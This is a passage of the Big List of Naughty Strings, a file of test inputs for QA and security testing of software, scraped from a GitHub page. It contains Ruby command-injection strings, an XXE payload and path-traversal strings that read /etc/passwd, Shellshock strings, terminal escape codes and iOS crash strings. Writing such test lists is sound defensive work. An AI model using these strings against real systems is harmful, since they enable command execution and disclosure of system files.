@{[system "touch /tmp/blns.fail"]}

#	Command Injection (Ruby)
#
#	Strings which can call system commands within Ruby/Rails applications

eval("puts 'hello world'")
System("ls -al /")
`ls -al /`
Kernel.exec("ls -al /")
Kernel.exit(1)
%x('ls -al /')

#      XXE Injection (XML)
#
#	String which can reveal system files when parsed by a badly configured XML parser

<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

#	Unwanted Interpolation
#
#	Strings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string.

$HOME
$ENV{'HOME'}
%d
%s%s%s%s%s
{0}
%*.*s
%@
%n
File:///

#	File Inclusion
#
#	Strings which can cause user to pull in files that should not be a part of a web server

../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../etc/hosts

#	Known CVEs and Vulnerabilities
#
#	Strings that test for known vulnerabilities

() { 0; }; touch /tmp/blns.shellshock1.fail;
() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
<<< %s(un='%s') = %u
+++ATH0

#	MSDOS/Windows Special Filenames
#
#	Strings which are reserved characters in MSDOS/Windows

CON
PRN
AUX
CLOCK$
NUL
A:
ZZ:
COM1
LPT1
LPT2
LPT3
COM2
COM3
COM4

#   IRC specific strings
#
#   Strings that may occur on IRC clients that make security products freak out

DCC SEND STARTKEYLOGGER 0 0 0

#	Scunthorpe Problem
#
#	Innocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem)

Scunthorpe General Hospital
Penistone Community Church
Lightwater Country Park
Jimmy Clitheroe
Horniman Museum
shitake mushrooms
RomansInSussex.co.uk
http://www.cum.qc.ca/
Craig Cockburn, Software Specialist
Linda Callahan
Dr. Herman I. Libshitz
magna cum laude
Super Bowl XXX
medieval erection of parapets
evaluate
mocha
expression
Arsenal canal
classic
Tyson Gay
Dick Van Dyke
basement

#	Human injection
#
#	Strings which may cause human to reinterpret worldview

If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.

#	Terminal escape codes
#
#	Strings which punish the fools who use cat/type on this file

Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
But now...[20Cfor my greatest trick...[8m
The quick brown fox... [Beeeep]

#	iOS Vulnerabilities
#
#	Strings which crashed iMessage in various versions of iOS

Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
🏳0🌈️
జ్ఞ‌ా

# Persian special characters
#
# This is a four characters string which includes Persian special characters (گچپژ)

گچپژ
© 2020 GitHub, Inc.
Terms
Privacy
Security
Status
Help
Contact GitHub
Pricing
API
Training
Blog
About
